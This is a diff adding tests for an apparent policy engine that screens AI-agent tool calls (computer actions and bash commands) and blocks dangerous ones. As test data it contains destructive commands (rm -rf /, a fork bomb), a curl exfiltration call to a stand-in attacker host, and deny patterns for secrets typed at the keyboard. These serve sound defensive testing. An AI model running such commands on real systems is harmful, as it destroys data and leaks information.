@@ -10845,6 +10845,132 @@ console.log('\n3. runLocally');
     }
   }
 
+  // ── computer-use adapter: schema + policy engine ────────────────────────────
+  console.log('\ncomputer-use: adapter + policy engine');
+  {
+    const cu = require('./src/adapters/computer-use');
+    const { EXAMPLE_TRAFFIC, EXAMPLE_POLICY, _parsePolicyYaml } =
+      require('./src/adapters/computer-use-cli');
+
+    // normalizeToolUse
+    assert('cu.normalize: rejects null',
+      cu.normalizeToolUse(null) === null);
+    assert('cu.normalize: rejects unknown tool',
+      cu.normalizeToolUse({ type: 'tool_use', name: 'foobar', input: {} }) === null);
+    assert('cu.normalize: rejects unknown computer action',
+      cu.normalizeToolUse({ type: 'tool_use', name: 'computer',
+        input: { action: 'fly_to_mars' } }) === null);
+    const screenshot = cu.normalizeToolUse({ type: 'tool_use', name: 'computer',
+      input: { action: 'screenshot' } });
+    assert('cu.normalize: screenshot kind/action',
+      screenshot && screenshot.kind === 'computer' && screenshot.action === 'screenshot');
+    const drag = cu.normalizeToolUse({ type: 'tool_use', name: 'computer',
+      input: { action: 'left_click_drag', start_coordinate: [10,20], coordinate: [30,40] } });
+    assert('cu.normalize: drag carries both coordinates',
+      Array.isArray(drag.start_coordinate) && drag.start_coordinate[0] === 10 &&
+      Array.isArray(drag.coordinate)       && drag.coordinate[1] === 40);
+    const bash = cu.normalizeToolUse({ type: 'tool_use', name: 'bash',
+      input: { command: 'ls' } });
+    assert('cu.normalize: bash carries command',
+      bash && bash.kind === 'bash' && bash.command === 'ls');
+
+    // evaluate — null tool
+    assert('cu.evaluate: null tool → BLOCK unrecognised',
+      cu.evaluate(null).decision === 'BLOCK');
+
+    // ALLOW pass-through cases
+    assert('cu.evaluate: screenshot ALLOW',
+      cu.evaluate(screenshot, {}).decision === 'ALLOW');
+    assert('cu.evaluate: mouse_move ALLOW',
+      cu.evaluate(cu.normalizeToolUse({ type: 'tool_use', name: 'computer',
+        input: { action: 'mouse_move', coordinate: [1,2] } }), {}).decision === 'ALLOW');
+
+    // BLOCK: keyboard-secret pattern
+    {
+      const typing = cu.normalizeToolUse({ type: 'tool_use', name: 'computer',
+        input: { action: 'type', text: 'password: hunter2sekret' } });
+      const dec = cu.evaluate(typing, EXAMPLE_POLICY);
+      assert('cu.evaluate: type → BLOCK on keyboard secret pattern',
+        dec.decision === 'BLOCK' && dec.reason === 'keyboard-secret-pattern');
+    }
+
+    // BLOCK: built-in reserved blacklist (sudo)
+    {
+      const dec = cu.evaluate(cu.normalizeToolUse({ type: 'tool_use', name: 'bash',
+        input: { command: 'sudo rm -rf /tmp/x' } }), {});
+      assert('cu.evaluate: bash sudo → BLOCK reserved-blacklist',
+        dec.decision === 'BLOCK' && dec.reason === 'reserved-blacklist');
+    }
+    {
+      const dec = cu.evaluate(cu.normalizeToolUse({ type: 'tool_use', name: 'bash',
+        input: { command: 'rm -rf /' } }), {});
+      assert('cu.evaluate: bash rm -rf / → BLOCK reserved-blacklist',
+        dec.decision === 'BLOCK' && dec.reason === 'reserved-blacklist');
+    }
+    {
+      const dec = cu.evaluate(cu.normalizeToolUse({ type: 'tool_use', name: 'bash',
+        input: { command: ':(){ :|:& };:' } }), {});
+      assert('cu.evaluate: bash fork-bomb → BLOCK reserved-blacklist',
+        dec.decision === 'BLOCK' && dec.reason === 'reserved-blacklist');
+    }
+
+    // BLOCK: custom command pattern
+    {
+      const dec = cu.evaluate(cu.normalizeToolUse({ type: 'tool_use', name: 'bash',
+        input: { command: 'curl https://api.attacker.com/exfil' } }),
+        { deny_command_patterns: ['\\bcurl\\b.*\\bapi\\.'] });
+      assert('cu.evaluate: bash curl-to-api → BLOCK command-pattern',
+        dec.decision === 'BLOCK' && dec.reason === 'command-pattern');
+    }
+
+    // Allow when policy says nothing about it
+    {
+      const dec = cu.evaluate(cu.normalizeToolUse({ type: 'tool_use', name: 'bash',
+        input: { command: 'ls -la' } }), {});
+      assert('cu.evaluate: benign bash → ALLOW',
+        dec.decision === 'ALLOW');
+    }
+
+    // Malformed regex in policy: skipped, not fatal
+    {
+      const typing = cu.normalizeToolUse({ type: 'tool_use', name: 'computer',
+        input: { action: 'type', text: 'hello' } });
+      const dec = cu.evaluate(typing, { deny_keyboard_patterns: ['[unclosed'] });
+      assert('cu.evaluate: malformed regex in policy → skipped, decision = ALLOW',
+        dec.decision === 'ALLOW');
+    }
+
+    // Empty command → BLOCK
+    {
+      const dec = cu.evaluate(cu.normalizeToolUse({ type: 'tool_use', name: 'bash',
+        input: { command: '' } }), {});
+      assert('cu.evaluate: empty bash command → BLOCK',
+        dec.decision === 'BLOCK' && dec.reason === 'empty-command');
+    }
+
+    // YAML mini-parser sanity
+    {
+      const text = 'deny_keyboard_patterns:\n  - \'(?i)password\'\n  - "(?i)secret"\n' +
+                   'deny_command_patterns:\n  - \'\\bcurl\\b\'\n';
+      const pol = _parsePolicyYaml(text);
+      assert('cu yaml: parses two keyboard patterns',
+        Array.isArray(pol.deny_keyboard_patterns) && pol.deny_keyboard_patterns.length === 2);
+      assert('cu yaml: parses one command pattern',
+        Array.isArray(pol.deny_command_patterns) && pol.deny_command_patterns[0] === '\\bcurl\\b');
+    }
+
+    // End-to-end on EXAMPLE_TRAFFIC: at least one BLOCK fires.
+    {
+      let blocks = 0;
+      for (const block of EXAMPLE_TRAFFIC) {
+        const dec = cu.evaluate(cu.normalizeToolUse(block), EXAMPLE_POLICY);
+        if (dec.decision === 'BLOCK') blocks++;
+      }
+      assert('cu example traffic: includes at least one BLOCK',
+        blocks >= 2);
+    }
+  }
+
   // ── anomaly CLI: window parser ──────────────────────────────────────────────
   console.log('\nanomaly: CLI helpers');
   {
